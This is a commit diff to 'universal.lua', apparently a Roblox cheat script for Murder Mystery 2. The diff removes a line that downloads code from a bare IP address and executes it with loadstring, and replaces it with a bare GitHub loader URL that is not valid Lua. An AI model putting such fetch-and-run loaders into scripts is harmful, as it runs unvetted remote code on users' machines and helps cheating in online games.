e0b4bcab05a7a61c37799cab4fb1d209c41feec1
dupeguy <vincejoshua0000@gmail.com>
2026-02-23 15:47:32 +0800

    Update universal.lua

--- universal.lua
+++ universal.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjdkZmU2OTliLTc3OGYtNDljZC1hYjVlLTNhNTc3YmFjODBmOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
+https://github.com/fvs-creator/FVS-mm2/blob/main/loader.lua
